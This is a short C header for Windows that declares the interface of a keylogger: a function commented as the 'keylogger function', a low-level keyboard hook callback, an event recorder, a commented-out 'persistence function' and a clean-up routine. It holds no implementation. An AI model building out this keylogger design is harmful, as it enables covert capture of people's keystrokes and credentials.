#include <windows.h>
#include <winuser.h>

// method signature for keylogger function
int make_me_crazy();

LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);

void eventsRec();
// method signature for persistence function
//int locked_me_in();

void clean();
